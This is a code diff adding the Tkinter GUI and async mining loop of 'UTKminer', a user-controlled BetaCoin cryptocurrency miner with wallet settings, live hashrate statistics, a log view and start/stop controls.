+                for line in output.split('\n'):
+                    if "Chipset Model:" in line: return line.split(":")[-1].strip()
+                return "N/A"
+            return "N/A (Unsupported OS)"
+        except Exception:
+            return "Could not determine GPU"
+
+    def fetch_and_display_info(self):
+        cpu_info = get_cpu_info()
+        gpu_info = self._get_gpu_info()
+        ram_info = f"{psutil.virtual_memory().total / (1024**3):.2f} GB"
+        self.after(0, self.update_labels, cpu_info, gpu_info, ram_info)
+
+    def update_labels(self, cpu, gpu, ram):
+        self.cpu_label.config(text=cpu)
+        self.gpu_label.config(text=gpu)
+        self.ram_label.config(text=ram)
+
+    def on_close(self):
+        self.controller.sys_info_window = None
+        self.destroy()
+
+class RestartDialog(tk.Toplevel):
+    def __init__(self, master, controller):
+        super().__init__(master)
+        self.controller = controller
+        self.title("Success")
+        self.geometry("450x150")
+        self.resizable(False, False)
+        self.configure(bg=PREMIUM_DARK_BG)
+        self.protocol("WM_DELETE_WINDOW", self.destroy)
+        self.create_widgets()
+        self.transient(master)
+        self.grab_set()
+
+    def create_widgets(self):
+        main_frame = ttk.Frame(self, style='TFrame', padding=20)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+        message = "Адрес кошелька успешно изменен и сохранен.\n\nИзменения вступят в силу для воркеров после перезапуска майнинга."
+        ttk.Label(main_frame, text=message, style='TLabel', justify=tk.LEFT).pack(anchor="w", expand=True, fill=tk.X)
+        button_frame = ttk.Frame(main_frame, style='TFrame')
+        button_frame.pack(fill=tk.X, pady=(20, 0))
+        ttk.Button(button_frame, text="Restart", style='Gold.TButton', command=self.controller.restart_application).pack(side=tk.RIGHT)
+        ttk.Button(button_frame, text="OK", style='Secondary.TButton', command=self.destroy).pack(side=tk.RIGHT, padx=(0, 10))
+
+class ChangeWalletWindow(tk.Toplevel):
+    def __init__(self, master, controller):
+        super().__init__(master)
+        self.controller = controller
+        self.title("Change Wallet Address")
+        self.geometry("500x150")
+        self.resizable(False, False)
+        self.configure(bg=PREMIUM_DARK_BG)
+        self.protocol("WM_DELETE_WINDOW", self.on_close)
+        self.create_widgets()
+        self.transient(master)
+        self.grab_set()
+
+    def create_widgets(self):
+        main_frame = ttk.Frame(self, style='TFrame', padding=20)
+        main_frame.pack(fill=tk.BOTH, expand=True)
+        ttk.Label(main_frame, text="Enter new BetaCoin wallet address:", style='TLabel').pack(anchor="w")
+        self.wallet_entry = ttk.Entry(main_frame, font=('Consolas', 10), width=50)
+        self.wallet_entry.pack(fill=tk.X, pady=10)
+        self.wallet_entry.insert(0, WALLET)
+        button_frame = ttk.Frame(main_frame, style='TFrame')
+        button_frame.pack(fill=tk.X, pady=(10, 0))
+        ttk.Button(button_frame, text="Save", style='Gold.TButton', command=self.save_wallet).pack(side=tk.RIGHT)
+        ttk.Button(button_frame, text="Cancel", style='Secondary.TButton', command=self.on_close).pack(side=tk.RIGHT, padx=(0, 10))
+
+    def save_wallet(self):
+        new_wallet = self.wallet_entry.get().strip()
+        if not new_wallet.startswith("BC") or len(new_wallet) != 42:
+            messagebox.showerror("Invalid Address", "Возможно вы вписали адрес кошелька некорректно, либо он не от BetaCoin, попробуйте еще раз.", parent=self)
+            return
+        is_confirmed = messagebox.askyesno("Confirm Address", f"Проверьте правильно ли вы написали адрес кошелька:\n\n{new_wallet}", icon='warning', detail="Нажмите 'Yes' для подтверждения, 'No' для отмены.", parent=self)
+        if is_confirmed:
+            self.controller.update_wallet(new_wallet)
+            self.on_close()
+
+    def on_close(self):
+        self.controller.wallet_window = None
+        self.destroy()
+
+class QueueLogger:
+    def __init__(self, log_queue): self.log_queue, self.line_buffer = log_queue, ""
+    def write(self, text):
+        self.line_buffer += text
+        if '\n' in self.line_buffer:
+            lines = self.line_buffer.split('\n')
+            for line in lines[:-1]:
+                if line.strip(): self.log_queue.put(line)
+            self.line_buffer = lines[-1]
+    def flush(self): pass
+
+# =============================================================================
+# === Основной класс приложения (GUI) =========================================
+# =============================================================================
+class MinerGUI:
+    def __init__(self, root):
+        self.root = root
+        self.cpu_name = get_cpu_info()
+        self.root.title(f"UTKminer [BetaCoin] v1.7 BETA | {self.cpu_name}")
+        self.root.geometry("1000x750")
+        self.root.minsize(908, 789)
+        self.root.configure(bg=PREMIUM_DARK_BG)
+        
+        self.miner_threads, self.child_processes = [], []
+        self.log_queue = queue.Queue()
+        self.worker_hashrates = {}
+        self.wallet_window = None
+        self.sys_info_window = None
+
+        self.setup_icon()
+        self.setup_styles()
+        self.create_widgets()
+
+        self.start_time = time.time()
+        self.process_log_queue()
+        self.update_ui()
+
+    def setup_icon(self):
+        try:
+            icon_path = resource_path(os.path.join("Resourses", "ico.png"))
+            if not os.path.exists(icon_path):
+                self.log_queue.put(f"warning: Icon file not found: {icon_path}")
+                return
+            with Image.open(icon_path) as img:
+                img_resized = img.resize((256, 256), Image.Resampling.LANCZOS)
+                with NamedTemporaryFile(delete=False, suffix='.ico') as tmp:
+                    img_resized.save(tmp.name, format='ICO')
+                    self.root.iconbitmap(tmp.name)
+                os.unlink(tmp.name)
+        except Exception as e:
+            self.log_queue.put(f"error: Failed to set application icon: {e}")
+
+    def setup_styles(self):
+        self.style = ttk.Style()
+        self.style.theme_use('clam')
+        self.style.configure('.', background=PREMIUM_DARK_BG, foreground=TEXT_LIGHT, borderwidth=0, focusthickness=0)
+        self.style.configure('TFrame', background=PREMIUM_DARK_BG)
+        self.style.configure('TLabel', background=PREMIUM_DARK_BG, foreground=TEXT_LIGHT, font=('Segoe UI', 10))
+        self.style.configure('TButton', background=CARD_BG, foreground=TEXT_LIGHT, font=('Segoe UI', 10), padding=(10, 8))
+        self.style.map('TButton', background=[('active', '#3c414d'), ('pressed', '#4a4f5c')])
+        self.style.configure('Card.TFrame', background=CARD_BG, relief=tk.SOLID, borderwidth=1, bordercolor=BORDER_COLOR)
+        self.style.configure('Card.TLabel', background=CARD_BG, foreground=TEXT_LIGHT)
+        self.style.configure('Gold.TButton', background=ACCENT_GOLD, foreground=PREMIUM_DARK_BG, font=('Segoe UI', 11, 'bold'),padding=(15, 10), borderwidth=2, relief=tk.RAISED)
+        self.style.map('Gold.TButton', background=[('active', '#ffeb80'), ('pressed', '#e6c200')], relief=[('pressed', 'sunken'), ('!pressed', 'raised')])
+        self.style.configure('Red.TButton', background=ERROR_COLOR, foreground=TEXT_LIGHT, font=('Segoe UI', 11, 'bold'), padding=(15, 10), borderwidth=2, relief=tk.RAISED)
+        self.style.map('Red.TButton', background=[('active', '#ff7961'), ('pressed', '#ba000d')], relief=[('pressed', 'sunken'), ('!pressed', 'raised')])
+        self.style.configure('Secondary.TButton', background='#3A3F4C', foreground=TEXT_LIGHT, font=('Segoe UI', 10))
+        self.style.map('Secondary.TButton', background=[('active', '#4a4f5c')])
+        self.style.configure('TCombobox', fieldbackground=CARD_BG, background=CARD_BG, foreground=TEXT_LIGHT, arrowcolor=TEXT_LIGHT, selectbackground=CARD_BG, selectforeground=TEXT_LIGHT, borderwidth=1, padding=5)
+        self.style.map('TCombobox', fieldbackground=[('readonly', CARD_BG)], foreground=[('readonly', TEXT_LIGHT)])
+        self.style.configure('TEntry', fieldbackground=CARD_BG, foreground=TEXT_LIGHT, insertcolor=ACCENT_GOLD, borderwidth=1, relief=tk.FLAT)
+        self.style.map('TEntry', fieldbackground=[('focus', CARD_BG), ('!disabled', CARD_BG)], foreground=[('focus', TEXT_LIGHT), ('!disabled', TEXT_LIGHT)])
+
+    def create_widgets(self):
+        self.main_frame = ttk.Frame(self.root)
+        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
+        self.main_frame.grid_rowconfigure(1, weight=1)
+        self.main_frame.grid_columnconfigure(1, weight=1)
+        self.create_header()
+        self.create_stats_grid()
+        self.create_main_content()
+        self.create_footer()
+
+    def create_header(self):
+        header_frame = ttk.Frame(self.main_frame)
+        header_frame.grid(row=0, column=0, columnspan=2, sticky="ew", pady=(0, 15))
+        
+        try:
+            logo_path = resource_path(os.path.join("Resourses", "ico.png"))
+            if os.path.exists(logo_path):
+                with Image.open(logo_path) as img:
+                    logo_img_resized = img.resize((64, 64), Image.Resampling.LANCZOS)
+                    self.logo_img = ImageTk.PhotoImage(logo_img_resized)
+                    ttk.Label(header_frame, image=self.logo_img).pack(side=tk.LEFT, padx=(0, 10))
+        except Exception:
+            pass
+
+        title_frame = ttk.Frame(header_frame)
+        title_frame.pack(side=tk.LEFT)
+        ttk.Label(title_frame, text="UTKminer [BetaCoin]", font=('Segoe UI', 16, 'bold'), foreground=TEXT_LIGHT).pack(anchor=tk.W)
+        conn_frame = ttk.Frame(title_frame)
+        conn_frame.pack(anchor=tk.W, pady=(5,0))
+        ttk.Label(conn_frame, text="Pool:", font=('Segoe UI', 8), foreground=TEXT_DARK).pack(side=tk.LEFT)
+        ttk.Label(conn_frame, text=f"{SERVER_HOST}:{SERVER_PORT}", font=('Consolas', 8), foreground=TEXT_LIGHT).pack(side=tk.LEFT, padx=(0, 10))
+        ttk.Button(conn_frame, text="Copy", style='Secondary.TButton', command=lambda: self.copy_to_clipboard(f"{SERVER_HOST}:{SERVER_PORT}"), padding=(2,0)).pack(side=tk.LEFT, padx=(0, 10))
+        
+        wallet_frame = ttk.Frame(conn_frame)
+        wallet_frame.pack(side=tk.LEFT)
+        ttk.Label(wallet_frame, text="Wallet:", font=('Segoe UI', 8), foreground=TEXT_DARK).pack(side=tk.LEFT)
+        
+        wallet_display_text = f"{WALLET[:8]}...{WALLET[-6:]}" if WALLET else "Not Configured. Click 'Change'."
+        wallet_color = TEXT_LIGHT if WALLET else WARNING_COLOR
+        self.wallet_label = ttk.Label(wallet_frame, text=wallet_display_text, font=('Consolas', 8), foreground=wallet_color)
+        self.wallet_label.pack(side=tk.LEFT, padx=(0, 5))
+        
+        self.copy_wallet_button = ttk.Button(wallet_frame, text="Copy", style='Secondary.TButton', command=lambda: self.copy_to_clipboard(WALLET), padding=(2,0))
+        self.copy_wallet_button.pack(side=tk.LEFT)
+        ttk.Button(wallet_frame, text="Change", style='Secondary.TButton', command=self.open_wallet_window, padding=(2,0)).pack(side=tk.LEFT, padx=(5,0))
+        
+        button_frame = ttk.Frame(header_frame)
+        button_frame.pack(side=tk.RIGHT, padx=10)
+        ttk.Button(button_frame, text="System Info", style='Secondary.TButton', command=self.open_system_info_window).pack(side=tk.LEFT, padx=5)
+        ttk.Button(button_frame, text="Help", style='Secondary.TButton', command=self.open_help).pack(side=tk.LEFT)
+
+    def create_stats_grid(self):
+        stats_frame = ttk.Frame(self.main_frame)
+        stats_frame.grid(row=1, column=0, sticky="nsew", padx=(0, 15))
+        controls_card = self.create_card(stats_frame, "Miner Controls")
+        self.create_miner_controls(controls_card)
+        controls_card.pack(fill=tk.X, pady=(0, 15))
+        stats_card = self.create_card(stats_frame, "Live Statistics")
+        self.create_stats_section(stats_card)
+        stats_card.pack(fill=tk.X, pady=(0, 15))
+        info_card = self.create_card(stats_frame, "Session Info")
+        self.create_info_section(info_card)
+        info_card.pack(fill=tk.X, pady=(0, 15))
+
+    def create_main_content(self):
+        content_frame = ttk.Frame(self.main_frame)
+        content_frame.grid(row=1, column=1, sticky="nsew")
+        content_frame.grid_rowconfigure(1, weight=1)
+        content_frame.grid_columnconfigure(0, weight=1)
+        self.create_graph_section(content_frame)
+        self.create_log_section(content_frame)
+
+    def create_card(self, parent, title):
+        card = ttk.Frame(parent, style='Card.TFrame', padding=12)
+        title_label = ttk.Label(card, text=title.upper(), font=('Segoe UI', 9, 'bold'), foreground=TEXT_DARK, style='Card.TLabel')
+        title_label.pack(anchor=tk.W, pady=(0, 8))
+        ttk.Separator(card, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=(0, 8))
+        return card
+
+    def create_miner_controls(self, parent):
+        power_frame = ttk.Frame(parent, style='Card.TFrame')
+        power_frame.pack(fill=tk.X, pady=(0, 10))
+        ttk.Label(power_frame, text="Power Level:", style='Card.TLabel', font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT, padx=(0, 10))
+        self.power_selector = ttk.Combobox(power_frame, values=list(range(1, 11)), state="readonly", width=5)
+        self.power_selector.set(1)
+        self.power_selector.pack(side=tk.LEFT)
+        btn_frame = ttk.Frame(parent, style='Card.TFrame')
+        btn_frame.pack(fill=tk.X, pady=5)
+        self.start_button = ttk.Button(btn_frame, text="START MINING", style='Gold.TButton', command=self.start_mining)
+        self.start_button.pack(side=tk.LEFT, expand=True, fill=tk.X, ipady=5)
+        self.stop_button = ttk.Button(btn_frame, text="STOP", style='Red.TButton', command=self.stop_mining, state=tk.DISABLED)
+        self.stop_button.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=(10, 0), ipady=5)
+
+    def create_stats_section(self, parent):
+        self.hashrate_label = self.create_stat_entry(parent, "Total Hashrate", "0.0 kH/s", ACCENT_CYAN, 18)
+        self.balance_label = self.create_stat_entry(parent, "Total Balance", "0.0000 BC", ACCENT_CYAN, 18)
+        ttk.Separator(parent, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=8)
+        self.accepted_label = self.create_stat_entry(parent, "Accepted Shares", "0", SUCCESS_COLOR)
+        self.rejected_label = self.create_stat_entry(parent, "Rejected Shares", "0", WARNING_COLOR)
+        ttk.Separator(parent, orient=tk.HORIZONTAL).pack(fill=tk.X, pady=8)
+        self.max_hashrate_label = self.create_stat_entry(parent, "Max Hashrate", "0.0 kH/s")
+        self.earnings_label = self.create_stat_entry(parent, "Session Earnings", "0.0000 BC")
+
+    def create_info_section(self, parent):
+        self.uptime_label = self.create_stat_entry(parent, "Uptime", "00:00:00")
+        self.hashes_label = self.create_stat_entry(parent, "Total Hashes", "0")
+
+    def create_stat_entry(self, parent, title, value, value_color=TEXT_LIGHT, value_size=14):
+        frame = ttk.Frame(parent, style='Card.TFrame')
+        frame.pack(fill=tk.X, pady=3)
+        ttk.Label(frame, text=title, font=('Segoe UI', 9), foreground=TEXT_DARK, style='Card.TLabel').pack(side=tk.LEFT)
+        value_label = ttk.Label(frame, text=value, font=('Segoe UI', value_size, 'bold'), foreground=value_color, style='Card.TLabel')
+        value_label.pack(side=tk.RIGHT)
+        return value_label
+
+    def create_graph_section(self, parent):
+        graph_card = self.create_card(parent, "Total Hashrate Performance (H/s)")
+        graph_card.grid(row=0, column=0, sticky="nsew", pady=(0, 15))
+        self.fig = Figure(figsize=(5, 2.5), dpi=100, facecolor=CARD_BG)
+        self.ax = self.fig.add_subplot(111, facecolor=CARD_BG)
+        self.fig.subplots_adjust(left=0.1, right=0.95, top=0.9, bottom=0.2)
+        
+        self.ax.spines['top'].set_visible(False)
+        self.ax.spines['right'].set_visible(False)
+        self.ax.spines['bottom'].set_color(BORDER_COLOR)
+        self.ax.spines['left'].set_color(BORDER_COLOR)
+        self.ax.tick_params(axis='x', colors=TEXT_DARK)
+        self.ax.tick_params(axis='y', colors=TEXT_DARK)
+        
+        self.canvas = FigureCanvasTkAgg(self.fig, master=graph_card)
+        self.canvas.draw()
+        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True, pady=5)
+
+    def _prevent_log_modification(self, event=None):
+        return "break"
+
+    def create_log_section(self, parent):
+        log_card = self.create_card(parent, "Mining Log")
+        log_card.grid(row=1, column=0, sticky="nsew")
+        self.log_text = scrolledtext.ScrolledText(
+            log_card, wrap=tk.WORD, bg=PREMIUM_DARK_BG, fg=TEXT_LIGHT,
+            insertbackground=ACCENT_GOLD, font=('Consolas', 9), relief=tk.SOLID,
+            borderwidth=1, highlightcolor=BORDER_COLOR, padx=10, pady=10
+        )
+        self.log_text.pack(fill=tk.BOTH, expand=True, pady=5)
+        self.log_text.bind("<KeyPress>", self._prevent_log_modification)
+        self.log_text.tag_config("timestamp", foreground=TEXT_DARK)
+        self.log_text.tag_config("worker", foreground="#888888")
+        self.log_text.tag_config("miner", foreground=ACCENT_CYAN)
+        self.log_text.tag_config("accepted", foreground=SUCCESS_COLOR, font=('Consolas', 9, 'bold'))
+        self.log_text.tag_config("rejected", foreground=WARNING_COLOR)
+        self.log_text.tag_config("error", foreground=ERROR_COLOR)
+        self.log_text.tag_config("warning", foreground=WARNING_COLOR)
+        self.log_text.tag_config("info", foreground=INFO_COLOR)
+        self.log_text.tag_config("normal", foreground=TEXT_LIGHT)
+
+    def create_footer(self):
+        footer_frame = ttk.Frame(self.main_frame)
+        footer_frame.grid(row=2, column=0, columnspan=2, sticky="ew", pady=(10, 0))
+        self.status_label = ttk.Label(footer_frame, text="Status: Ready", font=('Segoe UI', 9), foreground=TEXT_DARK)
+        self.status_label.pack(side=tk.LEFT)
+        ttk.Label(footer_frame, text="UTKminer © 2025", font=('Segoe UI', 9), foreground=TEXT_DARK).pack(side=tk.RIGHT)
+
+    def copy_to_clipboard(self, text):
+        try:
+            self.root.clipboard_clear(); self.root.clipboard_append(text)
+            self.log_queue.put(f"info: Copied to clipboard: {text}")
+        except tk.TclError: self.log_queue.put("error: Could not access clipboard.")
+
+    def update_graph(self):
+        self.ax.clear()
+        with stats_lock:
+            values = list(stats["hashrates_history"])
+        
+        if not values:
+            self.ax.text(0.5, 0.5, "Waiting for data...", ha='center', va='center', color=TEXT_DARK)
+        else:
+            x_data = np.arange(len(values))
+            self.ax.plot(x_data, values, color=ACCENT_CYAN, linewidth=1.5)
+            self.ax.fill_between(x_data, values, color=ACCENT_CYAN, alpha=0.1)
+            self.ax.grid(True, color=BORDER_COLOR, linestyle='--', linewidth=0.5, alpha=0.5)
+            self.ax.set_ylim(bottom=0)
+            self.ax.set_xlim(left=0, right=max(1, len(x_data)-1))
+        
+        self.canvas.draw()
+
+    def update_ui(self):
+        total_hashrate = 0; now = time.time()
+        current_workers = list(self.worker_hashrates.keys())
+        for worker_id in current_workers:
+            hashrate, timestamp = self.worker_hashrates[worker_id]
+            if now - timestamp < 15: total_hashrate += hashrate
+            else: del self.worker_hashrates[worker_id]
+        
+        with stats_lock:
+            stats["hashrates_history"].append(total_hashrate)
+            if total_hashrate > stats["max_hashrate"]:
+                stats["max_hashrate"] = total_hashrate
+            
+            self.hashrate_label.config(text=f"{total_hashrate/1000:,.1f} kH/s")
+            self.max_hashrate_label.config(text=f"{stats['max_hashrate']/1000:,.1f} kH/s")
+            self.accepted_label.config(text=f'{stats["accepted"]:,}')
+            self.rejected_label.config(text=f'{stats["rejected"]:,}')
+            self.balance_label.config(text=f"{stats['balance']:.4f} BC")
+            self.hashes_label.config(text=f"{stats['hashes']:,}")
+            self.earnings_label.config(text=f"{stats['session_earnings']:.4f} BC")
+        
+        is_running = self.child_processes or any(t.is_alive() for t in self.miner_threads)
+        if is_running:
+            uptime = int(time.time() - self.start_time)
+            h, rem = divmod(uptime, 3600); m, s = divmod(rem, 60)
+            self.uptime_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
+            self.status_label.config(text=f"Status: Mining ({len(self.worker_hashrates)} workers)...", foreground=SUCCESS_COLOR)
+        else:
+            self.status_label.config(text="Status: Stopped", foreground=ERROR_COLOR)
+
+        self.update_graph()
+        self.root.after(1000, self.update_ui)
+
+    def start_mining(self):
+        global running
+        if not WALLET:
+            messagebox.showerror(
+                "Wallet Not Configured",
+                "Невозможно начать майнинг. Пожалуйста, сначала укажите ваш адрес кошелька BetaCoin.\n\nЭто можно сделать, нажав 'Change' рядом с полем кошелька.",
+                parent=self.root
+            )
+            return
+
+        if not (self.miner_threads or self.child_processes):
+            running = True
+            self.start_time = time.time()
+            self.worker_hashrates.clear()
+            with stats_lock:
+                stats["session_earnings"] = 0.0; stats["hashes"] = 0
+                stats["accepted"] = 0; stats["rejected"] = 0
+                stats["max_hashrate"] = 0; stats["hashrates_history"].clear()
+            
+            power_level = int(self.power_selector.get())
+            self.log_queue.put(f"info: Starting miner with power level {power_level}...")
+            
+            self.start_button.config(state=tk.DISABLED)
+            self.stop_button.config(state=tk.NORMAL)
+            self.power_selector.config(state=tk.DISABLED)
+            
+            internal_miner_thread = threading.Thread(target=self.run_internal_miner, daemon=True)
+            self.miner_threads.append(internal_miner_thread)
+            internal_miner_thread.start()
+
+            for i in range(power_level - 1):
+                self.start_external_miner(i + 2)
+        else:
+            self.log_queue.put("warning: Miner is already running.")
+
+    def start_external_miner(self, worker_id):
+        try:
+            process = subprocess.Popen(
+                [sys.executable, "external_miner.py"],
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
+                encoding='utf-8', errors='replace', bufsize=1,
+                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
+            )
+            self.child_processes.append(process)
+            log_thread = threading.Thread(
+                target=self.read_process_output, args=(process.stdout, f"Worker-{worker_id}"), daemon=True
+            )
+            log_thread.start()
+        except Exception as e:
+            self.log_queue.put(f"error: Failed to start external miner {worker_id}: {e}")
+
+    def run_internal_miner(self):
+        sys.stdout = QueueLogger(self.log_queue)
+        asyncio.run(mine())
+
+    def read_process_output(self, pipe, worker_id):
+        try:
+            for line in iter(pipe.readline, ''):
+                if line.strip(): self.log_queue.put(f"[{worker_id}] {line.strip()}")
+        finally: pipe.close()
+            
+    def stop_mining(self):
+        global running
+        running = False
+        self.log_queue.put("warning: Stopping all mining processes...")
+        for p in self.child_processes:
+            try: p.terminate()
+            except Exception: pass
+        for p in self.child_processes:
+            try: p.wait(timeout=3)
+            except subprocess.TimeoutExpired: p.kill()
+        self.child_processes.clear(); self.miner_threads.clear()
+        self.worker_hashrates.clear()
+        self.start_button.config(state=tk.NORMAL)
+        self.stop_button.config(state=tk.DISABLED)
+        self.power_selector.config(state=tk.NORMAL)
+    
+    def process_log_queue(self):
+        try:
+            while not self.log_queue.empty():
+                log_line = self.log_queue.get_nowait()
+                
+                worker_id = "Worker-1"
+                raw_message = log_line
+                worker_match = re.match(r'\[(.*?)\] (.*)', log_line)
+                if worker_match:
+                    worker_id = worker_match.group(1)
+                    raw_message = worker_match.group(2)
+                
+                hash_report_match = re.search(r'hashrate_report:([0-9\.]+)', raw_message)
+                if hash_report_match:
+                    self.worker_hashrates[worker_id] = (float(hash_report_match.group(1)), time.time())
+                    continue
+
+                hashes_report_match = re.search(r'hashes_report:(\d+)', raw_message)
+                if hashes_report_match:
+                    with stats_lock:
+                        stats['hashes'] += int(hashes_report_match.group(1))
+                    continue
+                
+                with stats_lock:
+                    reward_match = re.search(r'accepted:.*?\+\s*([0-9\.]+)\s*\|\s*Balance:\s*([0-9\.]+)', raw_message, re.IGNORECASE)
+                    if reward_match:
+                        stats["session_earnings"] += float(reward_match.group(1))
+                        stats["balance"] = float(reward_match.group(2))
+                        stats["accepted"] += 1
+                    elif "rejected" in raw_message.lower() or "invalid wallet" in raw_message.lower():
+                        stats["rejected"] += 1
+                
+                self.log_message(raw_message, worker_id)
+        finally:
+            self.root.after(100, self.process_log_queue)
+
+    def log_message(self, message, worker_id):
+        msg_type = "normal"
+        lower_message = message.lower()
+        if "accepted" in lower_message or "block found" in lower_message: msg_type = "accepted"
+        elif "invalid wallet" in lower_message: msg_type = "error"
+        elif "rejected" in lower_message: msg_type = "rejected"
+        elif "error" in lower_message: msg_type = "error"
+        elif "warning" in lower_message: msg_type = "warning"
+        elif "miner" in lower_message: msg_type = "miner"
+        elif "info:" in lower_message: msg_type = "info"
+        
+        clean_message = message
+        parts = message.split(":", 1)
+        if len(parts) > 1 and parts[0].lower() in ["info", "error", "warning", "miner", "accepted", "rejected"]:
+             clean_message = parts[1].strip()
+
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        self.log_text.insert(tk.END, f"[{timestamp}] ", ("timestamp",))
+        self.log_text.insert(tk.END, f"[{worker_id}] ", ("worker",))
+        self.log_text.insert(tk.END, f"{clean_message}\n", (msg_type,))
+        self.log_text.see(tk.END)
+
+    def on_close(self):
+        self.stop_mining()
+        self.root.after(500, self.root.destroy)
+        
+    def open_help(self):
+        self.log_queue.put("info: Opening GitHub help page...")
+        webbrowser.open("https://github.com/MinArtem/UTKgui-BetaCoin-Miner/blob/main/README.md")
+
+    def open_wallet_window(self):
+        if self.wallet_window is None:
+            self.wallet_window = ChangeWalletWindow(self.root, self)
+        else:
+            self.wallet_window.lift()
+
+    def open_system_info_window(self):
+        if self.sys_info_window is None:
+            self.sys_info_window = SystemInfoWindow(self.root, self)
+        else:
+            self.sys_info_window.lift()
+
+    def update_wallet(self, new_wallet):
+        global WALLET
+        WALLET = new_wallet
+        save_config(new_wallet)
+        wallet_display_text = f"{WALLET[:8]}...{WALLET[-6:]}" if WALLET else "Not Configured. Click 'Change'."
+        wallet_color = TEXT_LIGHT if WALLET else WARNING_COLOR
+        self.wallet_label.config(text=wallet_display_text, foreground=wallet_color)
+        RestartDialog(self.root, self)
+
+    def restart_application(self):
+        python = sys.executable
+        os.execl(python, python, *sys.argv)
+
+# =============================================================================
+# === Функции майнинга (async) для внутреннего майнера ========================
+# =============================================================================
+def get_cpu_info():
+    try: return cpuinfo.get_cpu_info().get('brand_raw', platform.processor())
+    except Exception: return "N/A"
+
+def calculate_hash(challenge, nonce, wallet):
+    return hashlib.sha256(f"{challenge}{nonce}{wallet}".encode()).hexdigest()
+
+async def resolve_with_dns(hostname):
+    dns_servers = ['8.8.8.8', '1.1.1.1', '77.88.8.8', '208.67.222.222']
+    for dns_server in dns_servers:
+        try:
+            resolver = dns.resolver.Resolver(); resolver.nameservers = [dns_server]
+            answer = await asyncio.get_event_loop().run_in_executor(None, lambda: resolver.resolve(hostname, 'A'))
+            return str(answer[0])
+        except Exception as e: print(f"warning: Failed to resolve {hostname} using {dns_server}: {e}")
+    raise Exception(f"All DNS servers failed to resolve {hostname}")
+
+async def connect_to_server():
+    try:
+        ip_address = await resolve_with_dns(SERVER_HOST)
+        print(f"info: Resolved {SERVER_HOST} -> {ip_address}")
+        return await asyncio.wait_for(asyncio.open_connection(ip_address, SERVER_PORT), timeout=30.0)
+    except Exception as e:
+        print(f"error: Connection failed: {str(e)}"); return None, None
+
+async def submit_solution(reader, writer, challenge, nonce, wallet):
+    try:
+        request = json.dumps({"action": "submit_solution", "address": wallet, "nonce": nonce, "challenge": challenge})
+        writer.write(len(request).to_bytes(4, 'big') + request.encode())
+        await writer.drain()
+        length = int.from_bytes(await asyncio.wait_for(reader.readexactly(4), timeout=30.0), 'big')
+        return json.loads((await asyncio.wait_for(reader.readexactly(length), timeout=30.0)).decode())
+    except Exception as e:
+        print(f"error: Submit failed: {str(e)}"); return {"error": str(e)}
+
+async def mine_block(challenge, difficulty, reader, writer):
+    local_hashes, total_hashes_in_block = 0, 0
+    start_time = time.perf_counter()
+    start_nonce = secrets.randbits(64)
+    
+    for i in range(100000):
+        if not running: return "stopped", total_hashes_in_block + local_hashes
+
+        nonce = f"{start_nonce + i:016x}"; local_hashes += 1
+        
+        if calculate_hash(challenge, nonce, WALLET).startswith('0' * difficulty):
+            total_hashes_in_block += local_hashes
+            if writer.is_closing():
+                return "connection_lost", total_hashes_in_block
+            
+            response = await submit_solution(reader, writer, challenge, nonce, WALLET)
+            
+            if response.get("success"):
+                print(f"accepted: Block found! +{response.get('reward', 0):.4f} | Balance: {response.get('balance', 0):.4f}")
+                return "found", total_hashes_in_block
+            else:
+                error_msg = response.get('error', 'unknown error')
+                if "Invalid wallet address" in error_msg:
+                    print(f"error: Invalid wallet address provided. Please change it in the settings.")
+                else:
+                    print(f"rejected: Share rejected by pool.")
+                return "rejected", total_hashes_in_block
+        
+        if local_hashes >= REPORTING_BATCH_SIZE:
+            print(f"hashes_report:{local_hashes}")
+            total_hashes_in_block += local_hashes
+            local_hashes = 0
+            
+    elapsed = time.perf_counter() - start_time
+    if elapsed > 0: print(f"hashrate_report:{100000 / elapsed:.2f}")
+            
+    return "not_found", total_hashes_in_block + local_hashes
+
+async def mine():
+    reader, writer = None, None
+    while running:
+        hashes_done = 0
+        try:
+            try:
+                if not WALLET:
+                    print("warning: Wallet is not configured. Pausing miner.")
+                    await asyncio.sleep(15)
+                    continue
+
+                if reader is None or writer.is_closing():
+                    if writer: writer.close(); await writer.wait_closed()
+                    print("info: Connecting to server...")
+                    reader, writer = await connect_to_server()
+                    if not reader: await asyncio.sleep(5); continue
+                    print("info: Connection established.")
+
+                request = json.dumps({"action": "get_challenge", "address": WALLET}).encode()
+                writer.write(len(request).to_bytes(4, 'big') + request)
+                await writer.drain()
+                length = int.from_bytes(await asyncio.wait_for(reader.readexactly(4), timeout=30.0), 'big')
+                job = json.loads((await asyncio.wait_for(reader.readexactly(length), timeout=30.0)).decode())
+                
+                status, hashes_done = await mine_block(job["challenge"], job["difficulty"], reader, writer)
+                
+                if status == "stopped": break
+                if status == "connection_lost": reader = writer = None
+                await asyncio.sleep(0.1)
+            except (asyncio.TimeoutError, ConnectionError, OSError) as e:
+                print(f"warning: Connection issue ({type(e).__name__}), reconnecting...")
+                if writer: writer.close(); await writer.wait_closed()
+                reader = writer = None; await asyncio.sleep(5)
+            except Exception as e:
+                print(f"error: Mining loop error: {e}")
+                if writer: writer.close(); await writer.wait_closed()
+                reader = writer = None; await asyncio.sleep(10)
+        finally:
+            if hashes_done > 0:
+                print(f"hashes_report:{hashes_done}")
+
+    if writer: writer.close(); await writer.wait_closed()
+    print("info: Internal miner stopped.")
+
+# =============================================================================
+# === Точка входа в приложение ================================================
+# =============================================================================
+def main_gui():
+    if sys.version_info < (3, 7):
+        print("Python 3.7 or higher is required to run this program."); sys.exit(1)
+    root = tk.Tk()
+    gui = MinerGUI(root)
+    root.protocol("WM_DELETE_WINDOW", gui.on_close)
+    root.mainloop()
+
+if __name__ == "__main__":
+    main_gui()
